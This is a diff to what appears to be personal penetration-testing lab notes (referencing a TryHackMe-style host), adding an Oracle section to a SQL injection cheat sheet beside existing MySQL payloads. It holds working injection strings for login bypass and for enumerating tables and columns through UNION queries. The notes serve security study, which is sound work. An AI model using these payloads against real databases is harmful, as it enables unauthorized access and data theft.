@@ -317,7 +317,6 @@ Hacker                                                             website.thm  
   * Open Redirect
 
 ## SQL Injection
-### MySQL
 * `'or 1 = 1 -- `
 * 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
   * 從offset=1開始選取前50筆資料(略過最前面1筆)
@@ -382,7 +381,12 @@ Hacker                                                             website.thm  
     * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
   * With the 3 information above found, leak the information
     * `'union select $columnname,1 from $databasename.$tablename#` 
-
+* Oracle
+  * Every `SELECT` statement must specify a table to select `FROM`. There is a built-in table on Oracle called dual which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
+  * leak table name
+    * `SELECT table_name FROM all_tables`
+  * leak column name
+    * `SELECT column_name FROM all_tab_columns WHERE table_name = ''`
 
 ## XSS Injection
 * An injection attack where malicious JavaScript gets injected into a web application.
